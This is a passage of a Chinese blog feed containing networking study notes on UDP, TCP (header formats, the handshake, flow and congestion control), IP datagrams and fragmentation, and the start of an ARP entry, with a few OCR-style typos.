title="UDP协议的特点"></a>UDP协议的特点</h5><p>发送数据之前不需要建立连接，UDP主机不需要维持复杂的连接状态表。</p><p>UDP用户数据报只有8个字节的首部开销。<br>网络的拥塞不会使源主机的发送速率降低，这对某些实时应用是很重要的。·当数据包在传送过程中发生错误时UDP不能报告错误。<br>UDP保留应用程序定义的报文边界，当应用程序把一块数据交给UDP发送时，这块数据将作为独立的单元到达对方的应用程序，因此，应用程序必须关心IP数据报的长度。</p><h4 id="UDP报文格式："><a href="#UDP报文格式：" class="headerlink" title="UDP报文格式："></a>UDP报文格式：</h4><img src=".\传输协议UDP与TCP\UDP报文格式.png" style="zoom: 67%;" /><p>首部字段和数据字段。首部字段8个字节，由4个字段组成，每个字段2字节</p><ol><li>源端口:表示发送端的端口号。不同的应用程序使用不同的端口号，实现了同一时间段内多个应用程序可以一起使用网络进行数据的发送和接收。</li><li>目的端口:表示数据包被发往的目的端的端口号。</li><li>有效负载长度:包括UDP首部和UDP数据在内的整个用户数据报的长度。该字段的最小值是8，一些UDP实现将数据报的大小限制到了8192字节。</li><li>校验和:UDP的校验的校验范围包括伪首部（IP首部的部分字段)、UDP首部和UDP数据，该字段是可选的。如果该字段值为零就说明不进行校验。</li></ol><p>UDP用户数据报封装在IP数据报中，IP数据报的“协议类型”字段的值是17，表示数据部分是从UDP协议来的。</p><img src=".\传输协议UDP与TCP\UDP封装.png" style="zoom:67%;" /><h5 id="UDP校验和的计算"><a href="#UDP校验和的计算" class="headerlink" title="UDP校验和的计算"></a>UDP校验和的计算</h5><blockquote><p style="color:blue;">UDP校验和的计算与IP和ICMP校验和的计算不同。UDP校拉和T拉H围包括三部分:伪首部、UDP首部以及从应用层来的数据。</p></blockquote><p>伪首部是IP首部的一部分，其中有些字段要填入0。若校演和不包括伪首部，用户数据报也可能是安全的和正确的。但是，若lP首部受到损伤，则它可能被交付到错误的主机。</p><p>伪首部中的高层协议类型是为了确保这个数据报是属于UDP而不是是属丁于TCP。UDP的高层协议类型是17，若这个值在传输过程中出错，接收端就能检出并丢弃这个数据包，从而不会交付给错误的协议。</p><h4 id="UDP的应用："><a href="#UDP的应用：" class="headerlink" title="UDP的应用："></a>UDP的应用：</h4><p>UDP适用于这样的进程，它需要简单的请求—响应通信，而较少考虑流量控制和差错控制。对于需要传送成块数据的进程，如FTP，则通常不使用UDP。<br>UDP适用于具有内部流量控制和差错控制机制的进程。对多播和广播来说，UDP是个比较合适的传输层协议。UDP可用于管理进程，如SNMP协议。<br>UDP可用于某些路由选择更新协议，如RIP协议。</p><h3 id="传输控制协议TCP"><a href="#传输控制协议TCP" class="headerlink" title="传输控制协议TCP"></a>传输控制协议TCP</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># 掌握TCP协议的报文格式</span><span class="token comment"># 掌握TCP连接的建立和释放过程</span><span class="token comment"># 掌握TCP数据传输中编号与确认的过程掌握TCP协议校验和的计算方法</span><span class="token comment"># 理解TCP重传机制</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h4 id="TCP协议简介："><a href="#TCP协议简介：" class="headerlink" title="TCP协议简介："></a>TCP协议简介：</h4><p>TCP协议是TCP/IP协议族中的面向连接的、可靠的、端到端的运输层协议。</p><p>TCP提供全双工服务，全双工连接包括两个独立的、方向相反的数据流。与UDP不同，TCP允许发送和接收字节流形式的数据。为了使服务器和客户端以不同的速度双向发送和接收数据，TCP提供了发送和接收两个缓冲区。TCP在报文中加上一个递增的确认序列号来告诉发送端，接收端期望收到的下一个报文，如果在规定时间内，没有收到关于这个包的确认响应，则重新发送此包，这保证了TCP是一种可靠的传输层协议。</p><img src=".\传输协议UDP与TCP\TCP的熟知端口号.png" style="zoom:50%;" /><h4 id="TCP报文格式："><a href="#TCP报文格式：" class="headerlink" title="TCP报文格式："></a>TCP报文格式：</h4><img src=".\传输协议UDP与TCP\TCP报文格式.png" style="zoom: 50%;" /><p>源端口:2字节，主机中发送这个报文的应用程序端口号。</p><p>目的端口:2字节，目的主机中接收这个报文的应用程序的端口号。</p><p>序列号:4字节，定义了指派给本报文第一个数据字节的一个序号。TCP是流式传输协议，为了保证连通性，要在发送的每一个字节上编号。序号指定了这个序列中的哪一个字节是报文的第一个字节。在连接建立时，双方使用随机数产生器产生初始序号，通常每一方的初始序号都是不同的。</p><p>确认号:4字节，接收端期望收到的下一个报文段中数据部分的第一个字节的序号。</p><p>首部长度:4位，指定TCP首部的长度，以4字节为单位。首部长度可以在20~60字节之间。因此，这个字段的值可以在5至15之间。<br>保留字段:4位，保留为今后使用，目前应置为0。<br>控制字段:定义了8种不同的标志。用在TCP的流量控制、连接建立和终止以及数据传送的方式等方面。在同一时间可设置一位或多位标志。</p><img src=".\传输协议UDP与TCP\TCP的控制字段.png" style="zoom:67%;" /><img src="./网际协议IP/\TCP控制字段具体信息.png" style="zoom: 50%;" /><p>窗口:2字节，窗口字段用来控制对方发送的数据量，单位为字节。TCP连接的一端根据设置的缓存空间大小确定自己的接收窗口大小，然后通知对方以确定对方的发送窗口的上限。这时，发送端必须服从接收端的决定。</p><p>检验和:2字节，检验的范围包括首部和数据这两部分。在计算检验和时，要在TCP报文段的前面加上12字节的伪首部。</p><p>紧急指针:2字节，只有当URG=1时才有效，指出在本报文段中的紧急数据的最后一个字节的序号，使接收方知道紧急数据共有多少字节(紧急数据结束后是普通数据)。发送方TCP即使发送窗口为0，也要对带有URG标志的数据段实行强制发送。</p><p>选项:长度可变，最多40字节。</p><p>最大报文段长度MSS (Maximum Segment Size)。</p><blockquote><ul><li> TCP报文段中的数据字段的最大长度。</li><li>与接收窗口值没有关系，不是考虑接收方的缓存是否可以放下TCP报文段中的数据。</li><li>目的是提高网络的利用率，使TCP报文段携带的数据尽可能多，以提高分组中数据部分所占的比例。</li><li>MSS应该尽可能大，只要在IP层不需要进行分片即可。但由于传输路径的动态性，很难确定最佳MSS。</li><li>连接建立时，双方把自己能够支持的MSS通知对方，默认值是536 Byte。因此所有主机都能接受的报文段长度是556 Byte。</li></ul></blockquote><p>填充:为了使整个首部长度是4字节的整数倍，全0填充。</p><h5 id="TCP的封装："><a href="#TCP的封装：" class="headerlink" title="TCP的封装："></a>TCP的封装：</h5><p>TCP报文封装在lP数据报中，IP数据报的“协议类型”字段的值是6</p><img src=".\传输协议UDP与TCP\TCP的封装.png" style="zoom:67%;" /><h4 id="TCP链接的建立与释放："><a href="#TCP链接的建立与释放：" class="headerlink" title="TCP链接的建立与释放："></a>TCP链接的建立与释放：</h4><blockquote><p style="color:blue;">连接的三个阶段:连接建立、数据传送和连接释放。连接建立</p></blockquote><p>服务器首先准备接收TCP连接，这个过程叫做被动打开。这时的服务器的TCP已经准备好接受任何一台主机的TCP连接了。客户程序发出TCP请求的过程叫做主动打开。然后服务器与客户端就开始三次握手过程。</p><h5 id="三次握手建立连接："><a href="#三次握手建立连接：" class="headerlink" title="三次握手建立连接："></a>三次握手建立连接：</h5><p>1．客户发送第一个报文，这是一个SYN报文，在这个报文中只有SYN标志置为1，这个报文的作用是使序号同步。</p><img src=".\传输协议UDP与TCP\第一次握手.png" style="zoom:50%;" /><p>2．服务器发送第二个报文，即SYN+ACK报文，其中SYN和ACK标志被置为1首先，它是一个用来和对方进行通信的SYN报文。服务器使用这个报文同步初始序号，以便从服务器向客户发送字节。服务器还使用ACK标志确认已从客户端收到了SYN报文，同时给出期望从客户端收到的下一个序号。另外，服务器还定义了客户端要使用的接收窗口的大小。</p><img src=".\传输协议UDP与TCP\第二次握手.png" style="zoom:50%;" /><p>3．客户发送第三个报文。这仅仅是一个ACK报文。它使用ACK标志和确认号字段来确认收到了第二个报文。<br>然后客户端就可以通知上层应用进程，连接已经建立。服务器收到客户机的确认后，也通知上层应用进程，连接已经建立。</p><img src=".\传输协议UDP与TCP\第三次握手.png" style="zoom:50%;" /><h5 id="半关闭的四次握手方式终止连接："><a href="#半关闭的四次握手方式终止连接：" class="headerlink" title="半关闭的四次握手方式终止连接："></a>半关闭的四次握手方式终止连接：</h5><blockquote><p style="color:blue;">半关闭:TCP连接中，一方可以终止发送数据，但仍然保持接收数据，称为半关闭。半关闭通常是由客户端发起的。</p></blockquote><p><strong>半关闭的过程</strong></p><ol><li>客户发送FIN报文，半关闭了这个连接</li><li>服务器发送ACK报文接受了这个半关闭。但是，现在服务器仍然可以发送数据</li><li>当服务器已经把所有处理的数据都发送完毕时，就发送FIN报文</li><li>客户端发送ACK报文给予确认。<ul><li>在半关闭一条连接后，客户端仍然可以接收服务器发送的数据，而服务器也可以接收客户端发送的确认。但是，客户端不能传送数据给服务器。</li></ul></li></ol><img src=".\传输协议UDP与TCP\半关闭的四次握手方式终止连接.png" style="zoom:50%;" /><h4 id="流量控制："><a href="#流量控制：" class="headerlink" title="流量控制："></a>流量控制：</h4><p>发送端收到接收端的确认报文之前，对发送端发送的数据量进行管理</p><p>在不考虑流量控制的情况下，传输层协议可以每次只发送一个字节的数据，然后在发送下一个字节数据之前等待接收端的确认报文。这是一个非常缓慢的过程，发送端在等待确认报文时一直处于空闲状态。<br>还有一种情况是传输层协议一次就将全部数据发送出去，而不理会确认报文。这样虽然加速了发送过程，但可能会使接收端来不及接收而瘫痪。此外，若有一部分数据丢失、重复、失序或损坏，发送端就要一直等到接收端将全部数据都检查完毕后才能知道。</p><h4 id="滑动窗口"><a href="#滑动窗口" class="headerlink" title="滑动窗口"></a>滑动窗口</h4><p>TCP的流量控制在缓存上定义了一个窗口，称为滑动窗口，窗口大小的单位是字节，TCP发送数据的多少由滑动窗口决定。</p><p>TCP报文段首部的窗口字段就是给发送方设置的发送窗口的上限。</p><p>发送窗口在连接建立时由双方商定，在通信过程中动态调整。</p><p>如果发送方收到接收方的窗口大小U HIr以人tx’P送数据（带URG标志的数据段除外）。</p><img src=".\传输协议UDP与TCP\滑动窗口.png" style="zoom:67%;" /><p>发送端只要收到了对方的确认，发送窗口就可前移。<br>发送TCP维护一个指针。每发送一个报文段，指针向前移动一个报文段的距离。</p><blockquote><p style="color:red;">滑动窗口的右沿可以向左移动吗?</p>**滑动窗口的右沿向左移动通常发生在对方通知窗口缩小时**。使某些可以发送的数据变成不能发送，如果发送端已经发送了这些数据，就会产生错误。<p>TCP标准强烈不赞成这样做。</p></blockquote><blockquote><p style="color:red;">滑动窗口的左沿可以向左移动吗?</p>**窗口的左沿不能向左移动**，因为这表示已经发送出去的并且经过确认的数据现在又要回收了</blockquote><h4 id="拥塞控制："><a href="#拥塞控制：" class="headerlink" title="拥塞控制："></a>拥塞控制：</h4><h5 id="拥塞控制与流量控制的对比"><a href="#拥塞控制与流量控制的对比" class="headerlink" title="拥塞控制与流量控制的对比:"></a>拥塞控制与流量控制的对比:</h5><blockquote><p style="color:blue;">出现资源拥塞的条件:    对资源需求的总和>可用资源</p></blockquote><ul><li>防止过多的数据注入到网络中，可以使路由器或者链路不至于过载。</li><li>拥塞控制是一个<strong>全局性</strong>的过程，涉及到所有的主机、路由器，以及与降低网络传输性能有关的所有因素。</li></ul><p><strong>流量控制：</strong>在给定的发送端和接收端之间的<strong>点对点通信量的控制</strong>。</p><ul><li>流量控制所要做的就是抑制发送端发送数据的速率，以便使接收端来得及接收</li></ul><h5 id="拥塞控制的作用："><a href="#拥塞控制的作用：" class="headerlink" title="拥塞控制的作用："></a>拥塞控制的作用：</h5><img src=".\传输协议UDP与TCP\拥塞控制.png" style="zoom:50%;" /><h5 id="拥塞控制方法"><a href="#拥塞控制方法" class="headerlink" title="拥塞控制方法"></a>拥塞控制方法</h5><blockquote><p style="color:black;">慢开始:        初始设置拥塞窗口cwnd = 1，每收到一个对新的报文段的确认后，将拥塞窗口加1，逐步增大发送端的拥塞窗口cwnd。</p></blockquote><blockquote><p style="color:black;">拥塞避免:    使拥塞窗口cwnd按线性规律缓慢增长，“加法增大”。</p></blockquote><img src=".\传输协议UDP与TCP\慢开始于拥塞避免.png" style="zoom:50%;" /><blockquote><p style="color:black;">快重传:接收方每收到一个失序的报文段后就立即发出重复确认，这样做可以让发送方及早知道有报文段没有到达接收方。发送方只要一连收到三个重复确认就应当立即重传对方尚未收到的报文段。</p></blockquote><img src=".\传输协议UDP与TCP\快重传.png" style="zoom:50%;" /><blockquote><p style="color:black;">快恢复:当发送端收到连续三个重复的确认时，就执行“乘法减小”算法，把慢开始门限ssthresh 减半，但接下去不执行慢开始算法，而是执行拥塞避免算法“加法增大”，使拥塞窗口缓慢地线性增大，实现快恢复。</p></blockquote><img src=".\传输协议UDP与TCP\快恢复.png" style="zoom:50%;" /><h5 id="发送窗口大小"><a href="#发送窗口大小" class="headerlink" title="发送窗口大小:"></a>发送窗口大小:</h5><p>考虑拥塞控制的情况下，窗口大小由接收窗口和拥塞窗口两者中的较小者决定。接收窗口大小由接收方发送的确认报文中的窗口大小字段值所确定。这是接收端在缓存溢出导致数据被丢弃之前所能接受的最大字节数。拥塞窗口大小是由网络根据拥塞情况而确定的。<br>发送窗口的上限值= Min [rwnd, cwnd]</p><blockquote><ul><li><p>当rwnd &lt; cwnd时，是接收方的接收能力限制发送窗口的最大值</p></li><li><p>当cwnd &lt; rwnd时，则是网络的拥塞限制发送窗口的最大值。</p></li></ul></blockquote><h4 id="差错控制："><a href="#差错控制：" class="headerlink" title="差错控制："></a>差错控制：</h4><h5 id="TCP的差错控制"><a href="#TCP的差错控制" class="headerlink" title="TCP的差错控制"></a>TCP的差错控制</h5><ul><li>应用程序把数据流交付给TCP后，就依靠TCP把整个数据流交付给接收端的应用程序，并且保证数据流是按序的、没有差错的、也没有任何一部分是丢失的或重复的。</li><li>TCP使用差错控制提供可靠性。差错控制包括以下的一些机制:检测受到损伤的报文、丢失的报文、失序的报文和重复的报文。</li></ul><blockquote><p style="color:blue;">实现方式：通过校验和、确认以及超时重传三种机制实现</p></blockquote><ul><li><p>校验和:用来检验报文是否出错，如果出错，接收端就将报文丢弃</p></li><li><p>确认</p><ul><li>累积确认：不必对收到的分组逐个发送确认，而是对按序到达的最后一个分组发送确认</li><li>选择确认：首部选项SACK用于报告收到的不连续的字节块的边界</li><li>确认报文不携带数据，但消耗一个序号。除了ACK报文之外，确认报文也需要被确认。</li></ul></li><li><p>重传</p><ul><li>超时计时器到时:发送端为每一个TCP报文段都设置一个超时计时器，若计时器到时仍没收到确认，就重传这个报文。超时计时器的值是动态的，根据报文的往返时间而更新</li><li>快重传:发送端只要一连收到三个重复的ACK即可断定有报文段丢失了，就应立即重传而不必等待计时器超时。</li></ul></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;[TOC]&lt;/p&gt;
&lt;h2 id=&quot;传输层协议TCP与UDP&quot;&gt;&lt;a href=&quot;#传输层协议TCP与UDP&quot; class=&quot;headerlink&quot; title=&quot;传输层协议TCP与UDP&quot;&gt;&lt;/a&gt;传输层协议TCP与UDP&lt;/h2&gt;&lt;h3 id=&quot;进程间通信：&quot;&gt;&lt;a h</summary>
      
    
    
    
    <category term="网络工程相关" scheme="https://shierjinghuang.github.io/categories/%E7%BD%91%E7%BB%9C%E5%B7%A5%E7%A8%8B%E7%9B%B8%E5%85%B3/"/>
    
    
    <category term="网络协议分析" scheme="https://shierjinghuang.github.io/tags/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
  <entry>
    <title>网际协议IP</title>
    <link href="https://shierjinghuang.github.io/2022/11/12/%E7%BD%91%E9%99%85%E5%8D%8F%E8%AE%AEIP/"/>
    <id>https://shierjinghuang.github.io/2022/11/12/%E7%BD%91%E9%99%85%E5%8D%8F%E8%AE%AEIP/</id>
    <published>2022-11-12T06:40:20.000Z</published>
    <updated>2025-03-27T09:54:24.140Z</updated>
    
    <content type="html"><![CDATA[<h2 id="网际协议IP"><a href="#网际协议IP" class="headerlink" title="网际协议IP"></a>网际协议IP</h2><p>[TOC]</p><h3 id="IP协议简介（lP-Internet-Protocol）"><a href="#IP协议简介（lP-Internet-Protocol）" class="headerlink" title="IP协议简介（lP- Internet Protocol）"></a>IP协议简介（lP- Internet Protocol）</h3><ul><li>网际协议IP是TCP/IP最核心的协议，也是最重要的因特网标准协议之一</li><li>IP负责将数据包从源点交付到终点，所有的TCP、UDP、ICMP及IGMP数据都以IP数据报格式传输。</li></ul><h4 id="IP的特性："><a href="#IP的特性：" class="headerlink" title="IP的特性："></a>IP的特性：</h4><blockquote><p style="color:blue;">不可靠:不保证分组成功地送到目的站。任何可靠性的要求必须由上层协议实现。</p></blockquote><blockquote><p style="color:orange;">无连接:IP并不维护任何后续分组的状态信息，每个分组都是相互独立的</p></blockquote><blockquote><p style="color:red;">尽最大努力交付:IP协议尽力发送每个分组，只有当资源用完或网络出现故障时才会发送失败</p></blockquote><h4 id="IP地址及表示方法："><a href="#IP地址及表示方法：" class="headerlink" title="IP地址及表示方法："></a>IP地址及表示方法：</h4><p>IP地址：一个IP地址惟一地标识了Internet上的一台主机，IPv4协议使用32位地址，这表示地址空间是2^32。而IPv6协议使用128位地址，地址空间为2^128。<br>表示方法：点分十进制表示:每个字节用一个十进制数表示。</p><img src="./网际协议IP/IP地址分类.png"/><h5 id="网络号："><a href="#网络号：" class="headerlink" title="网络号："></a>网络号：</h5><p>D类地址和E类地址不划分网络号和主机号。</p><img src="./网际协议IP/网络号.png" style="zoom:67%;" /><h5 id="特殊的IP地址："><a href="#特殊的IP地址：" class="headerlink" title="特殊的IP地址："></a>特殊的IP地址：</h5><blockquote><p style="color:blue;">网络地址:主机号全0的IP地址，不分配给任何主机，作为网络本身的标识</p></blockquote><blockquote><p style="color:orange;">广播地址:主机号为全1的IP地址，用作广播地址，目的地址为广播地址的数据包传递给该网络中的所有节点</p></blockquote><blockquote><p style="color:skyblue;">有限广播地址:32位为全“1”的IP地址(255.255.255.255)，通常由无盘工作站启动时使用，希望从网络IP地址服务器处获得一个IP地址</p></blockquote><blockquote><p style="color:red;">主机本身地址:32位全“0”的IP地址(0.0.0.0)称为主机本身地址</p>- 当一个主机要获得其IP地址时，可以运行一个引导程序，并发送一个以全0为源地址、以全1为目的地址的分组给引导服务器，以获得本主机的IP地址。</blockquote><blockquote><p style="color:black;">环回地址:27.0.0.1称为回环地址，可用来测试TCP/IP协议是否正常工作，常用于本机上软件测试和本机上网络应用程序之间的通信地址。</p>- 使用回送地址发送数据，协议软件立即返回，不进行任何网络传输。</blockquote><h5 id="专用IP地址："><a href="#专用IP地址：" class="headerlink" title="专用IP地址："></a>专用IP地址：</h5><p>专用lIP地址:仅用于专用网内部的本地主机。<br>大多数路由器不转发携带专用IP地址的数据包，本地主机必须经网络地址转换服务器才能访问Internet。<br>专用IP地址范围: </p><img src="./网际协议IP/专用IP地址.png" style="zoom:67%;" /><h4 id="子网划分："><a href="#子网划分：" class="headerlink" title="子网划分："></a>子网划分：</h4><p><strong>Subnetting</strong><br>提高IP空间的利用率，增加IP分配的灵活性。<br>从主机号借用若干个比特作为子网号subnet-id，而主机号host-id也就相应减少若干个比特</p><p><img src="./%E7%BD%91%E9%99%85%E5%8D%8F%E8%AE%AEIP/%E5%AD%90%E7%BD%91%E5%88%92%E5%88%86%E7%A4%BA%E6%84%8F%E5%9B%BE.png"></p><h4 id="子网掩码："><a href="#子网掩码：" class="headerlink" title="子网掩码："></a>子网掩码：</h4><blockquote><p style="color:blue;">子网掩码是一个网络号全1，主机号全0的32位二进制数，用于确定P中有多少位用于子网号。</p>- **~~表示方法~~**：点分十进制，IP地址后用`/`后面写明网络号的位数- 子网掩码与IP地址**按位做与**得到IP地址对应的**网络地址**</blockquote><h3 id="IP数据格式："><a href="#IP数据格式：" class="headerlink" title="IP数据格式："></a>IP数据格式：</h3><p><img src="./%E7%BD%91%E9%99%85%E5%8D%8F%E8%AE%AEIP/IP%E7%9A%84%E6%8A%A5%E6%96%87%E6%A0%BC%E5%BC%8F.png"></p><p>IP数据报由首部和数据两部分组成</p><h4 id="各字段的含义："><a href="#各字段的含义：" class="headerlink" title="各字段的含义："></a>各字段的含义：</h4><p>版本:4 bit，指IP协议的版本，目前的IP协议版本号为4(即IPv4)</p><p>首部长度:4 bit，以4字节为单位，因此IP的首部长度最大是60字节</p><p>服务类型: 8 bit，区分服务，一般不用。</p><p>总长度: 16 bit，首部和数据之和的长度，单位为字节，因此数据报的最大长度为65535字节。总长度不能超过网络的最大传输单元MTU。</p><p>标识:16 bit，数据报计数器</p><blockquote><p>IP软件在存储器中维持一个计数器，每产生一个数据报，计数器加1，并将此值赋给标识字段。<br>当数据报由于长度超过网络MTU而必须分片时，标识字段的值就被复制到所有的数据报分片的标识字段中。<br>相同的标识字段的值使分片后的各数据报片能正确重组成原来的数据报。</p></blockquote><p>标志: 3 bit，目前只有两位有意义</p><blockquote><ul><li>第一位保留。</li><li>中间一位记为DF，为不分片标志，只有当DF=0时才允许分片。</li><li>最后一位为MF，MF=1表示后面还有分片，MF=O表示这是最后一个数据报片。</li></ul></blockquote><p>偏移量:13 bit，较长的分组被分片后，某分片在原分组中的相对位置。片偏移以8个字节为单位。每个分片的长度必须是8的整数倍。</p><p>生存时间:8 bit，记为TTL (Time To Live)</p><blockquote><ul><li><p>表明数据报在网络中的寿命，其单位为秒。现在TTL的单位是跳数，指明数据报在因特网中至多可经过多少个路由器，最大值为255，通常为32、64、128。</p></li><li><p>当TTL值为1时，表示这个数据报只能在本局域网内传送，因为这个数据报传送到局域网上的某个路由器，在被转发之前TTL值就减小到0，因而会被路由器丢弃。</p></li></ul></blockquote><p>协议: 8 bit，指出此数据报携带的数据使用何种协议，以便目的主机的IP层将数据部分上交给对应的进程处理。</p><p><img src="./%E7%BD%91%E9%99%85%E5%8D%8F%E8%AE%AEIP/IP%E7%9A%84%E9%AB%98%E5%B1%82%E5%8D%8F%E8%AE%AE.png"></p><p>首部检验和:16 bit，检验数据报的首部，不包括数据部分。采用简单的16位反码求和的计算方法。</p><p>源IP地址: 32bit，定义了源主机的IP地址。在IP数据包从源主机传送到目的主机期间，该字段保持不变。</p><p>目的IP地址: 32bit，定义了目的主机的IP地址。在IP数据报从源主机传送到目的主机期间，该字段保持不变。</p><h3 id="IP数据报分片："><a href="#IP数据报分片：" class="headerlink" title="IP数据报分片："></a>IP数据报分片：</h3><p>数据包可能经过多个不同的网络，每一个路由器把收到的帧进行拆装，处理后又封装成另一个帧。<br>收到帧的格式与长度取决于这个帧刚经过的物理网络所使用的协发<br>送出去的帧的格式与长度取决于这个帧将要经过的物理网络所使用的协议。</p><p><strong>最大传输单元MTU</strong>：不同网络所能传送的数据包的最大长度是不同的，这个最大长度叫做最大传输单元MTU ( Maximum Transmission Unit ) </p><blockquote><p style="color:orange;">MTU即该网络的数据链路层帧的数据部分的最大长度。</p></blockquote><h4 id="分片："><a href="#分片：" class="headerlink" title="分片："></a>分片：</h4><blockquote><ul><li><p>对于物理网络，如果数据包的长度超过了MTU，就要把数据部分进行分片。</p></li><li><p>每个分片都有自己的首部。</p></li><li><p>如果已经分片的数据包要经过更小MTU的网络，那么这些已经分片的数据包还可再进行分片，数据包在到达最后终点之前可以经过多次的分片。</p></li><li><p style="color:red;">数据包可以被源主机或在其路径上的路由器进行分片，但是数据包的重装只能在目的主机上进行。</p></li></ul></blockquote><h4 id="重组"><a href="#重组" class="headerlink" title="重组"></a>重组</h4><h5 id="目的主机进行分片重组"><a href="#目的主机进行分片重组" class="headerlink" title="目的主机进行分片重组"></a>目的主机进行分片重组</h5><blockquote><p style="color:blue;">IP规定，数据报分片的重组地点是目的主机，中间路由器不对任何被分片的数据报进行重组，即使其转发接口的MTU非常大。</p></blockquote><blockquote><p>优点:<br>简化了路由软件的操作，提高了路由器的处理效率。<br>可以避免重复分片。在数据报投递过程中，途经网络的MTU是不可预知的</p></blockquote><blockquote><p>缺点<br>浪费带宽。因为每个分片都要有一个首部，分片越多，首部开销越大。<br>增加了数据包丢失的可能性。分片越多，丢失的可能性越大。一旦丢失了一个分片，整个数据报就必须重新传输。</p></blockquote><h5 id="分片重组："><a href="#分片重组：" class="headerlink" title="分片重组："></a>分片重组：</h5><p>有关的三个字段是:标识字段、标志字段和偏移量字段。</p><p>当目的主机收到一个数据报时，可以根据偏移量和MF位判断:</p><ul><li>片偏移不为0，表明它是一个分片;</li><li>如果片偏移为0，且MF位为1，表明它是第一个分片;</li><li>如果片偏移为0，且MF位为0，则表明它是一个完整的数据报。</li></ul><p>根据数据报首部“标识”字段的值，可判断哪些分片属于同一个原始数据报片偏移用来确定分片在原始数据报中的位置。</p><h5 id="重组定时器："><a href="#重组定时器：" class="headerlink" title="重组定时器："></a>重组定时器：</h5><p>为防止因等待一个丢失的分片而无限期延长重组过程，在重组分片时启动一个定时器,如果超时后仍然没有收到一个数据报的全部分片，则该数据报被丢弃。<br>IP数据报校验和：</p><blockquote><p style="color:blue;">校验和：数据包上的附加信息，能够识别数据包在传输过程中是否出错。</p></blockquote><p>发送端先计算校验和，并把得到的结果与数据包一起发送出去。接收端对数据包进行同样的计算。若结果正确，则接受这个数据包，否则就丢弃它。</p><h4 id="校验和的计算："><a href="#校验和的计算：" class="headerlink" title="校验和的计算："></a>校验和的计算：</h4><p>发送端：将数据包按16位分段。把这些段用反码算术运算相加，将相加后得到的和再取反码就得出了校验和。<br>接收端：把收到的数据包按16位分段，并把这些段相加。得到的和取反码。若结果为0，则接受这个数据包，否则拒绝这个数据包。</p><img src="./网际协议IP/校验计算.png" style="zoom: 50%;" /><h4 id="说明："><a href="#说明：" class="headerlink" title="说明："></a>说明：</h4><blockquote><blockquote><p style="color:blue;">IP数据包的校验和只校验IP首部部分而不校验IP数据部分。</p></blockquote><ul><li>首先，所有将数据封装在IP数据报中的高层协议，都有覆盖整个数据包的校验和。因此，IP数据报的校验和就不必再检验所封装的数据部分。</li><li>其次，每经过一个路由器，IP数据包的首部就要改变一次，但数据部分不改变。因此若校验和包含数据部分，这就意味着路由器要花费很多时间计算没有改变的数据部分的校验和。</li></ul></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;网际协议IP&quot;&gt;&lt;a href=&quot;#网际协议IP&quot; class=&quot;headerlink&quot; title=&quot;网际协议IP&quot;&gt;&lt;/a&gt;网际协议IP&lt;/h2&gt;&lt;p&gt;[TOC]&lt;/p&gt;
&lt;h3 id=&quot;IP协议简介（lP-Internet-Protocol）&quot;&gt;&lt;a hre</summary>
      
    
    
    
    <category term="网络工程相关" scheme="https://shierjinghuang.github.io/categories/%E7%BD%91%E7%BB%9C%E5%B7%A5%E7%A8%8B%E7%9B%B8%E5%85%B3/"/>
    
    
    <category term="网络协议分析" scheme="https://shierjinghuang.github.io/tags/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE%E5%88%86%E6%9E%90/"/>
    
    <category term="IP协议" scheme="https://shierjinghuang.github.io/tags/IP%E5%8D%8F%E8%AE%AE/"/>
    
  </entry>
  
  <entry>
    <title>地址解析协议 ARP</title>
    <link href="https://shierjinghuang.github.io/2022/11/12/%E5%9C%B0%E5%9D%80%E8%A7%A3%E6%9E%90%E5%8D%8F%E8%AE%AEARP/"/>
    <id>https://shierjinghuang.github.io/2022/11/12/%E5%9C%B0%E5%9D%80%E8%A7%A3%E6%9E%90%E5%8D%8F%E8%AE%AEARP/</id>
    <published>2022-11-12T06:40:20.000Z</published>
    <updated>2025-03-27T09:33:34.001Z</updated>
    
    <content type="html"><![CDATA[<h2 id="地址解析协议-ARP"><a href="#地址解析协议-ARP" class="headerlink" title="地址解析协议 ARP"></a>地址解析协议 ARP</h2><p>[TOC]</p><h3 id="ARP的定义与基本功能"><a href="#ARP的定义与基本功能" class="headerlink" title="ARP的定义与基本功能"></a>ARP的定义与基本功能</h3><ul><li><p>掌握ARP协议的报文格式</p></li><li><p>掌握ARP协议的工作原理</p></li><li><p>理解ARP高速缓存的作用</p></li><li><p>掌握ARP缓存表的维护过程</p></li></ul><p><strong>ARP</strong>(Address Resolution Protocol，RFC 826）是根据IP地址获取物理地址的一个TCP/IP协议。主机通过将ARP请求<strong>广播</strong>到网络上的所有主机并接收返回消息来确定目标IP地址的物理地址，同时将IP地址和硬件地址存入本机ARP缓存中，下次请求时直接查询<strong>ARP缓存</strong>。</p><h4 id="物理地址："><a href="#物理地址：" class="headerlink" title="物理地址："></a>物理地址：</h4><p>物理地址通常是由硬件来实现的，例如以太网的物理地址被写入到网卡中，任何一块网卡的物理地址是唯一的</p><blockquote><p style="color:blue;">物理地址的长度和格式取决于具体的网络，以太网的物理地址是6字节地址物理地址可以是单播地址、多播地址或广播地址。</p></blockquote><h4 id="逻辑地址："><a href="#逻辑地址：" class="headerlink" title="逻辑地址："></a>逻辑地址：</h4><p>逻辑地址与物理设备本身没有关联, 逻辑地址可以是单播地址、多播地址和广播地址。</p><blockquote><p style="color:skyblue;">目前Internet上的IPv4协议逻辑地址是32位的IP地址， IPv6地址有128位长</blockquote><h4 id="地址解析"><a href="#地址解析" class="headerlink" title="地址解析:"></a>地址解析:</h4><p>逻辑地址是在网络层使用的，但数据包是在物理网络传递。主机或路由器是通过物理地址来识别的,因此将一个数据包传递到一个主机或路由器要进行寻址，需要将一个逻辑地址映射到相应的物理地址。</p><blockquote><p style="color:blue;">地址解析就是主机在发送帧前将目的逻辑地址转换成目的物理地址的过程。</p></blockquote><h5 id="静态映射"><a href="#静态映射" class="headerlink" title="静态映射:"></a>静态映射:</h5><p>手工创建IP地址与物理地址的映射关系，建立映射表。当已知IP地址时，通过查找映射表得到对应的物理地址。</p><blockquote><p style="color:orange;">局限性: 主机更换了网卡，也就改变了主机的物理地址。当主机从一个网络移到另一个网络时，物理地址没变，但IP地址改变了。·要适应这些变化，会增大维护静态映射表的开销。</p></blockquote><h5 id="用协议实现地址映射："><a 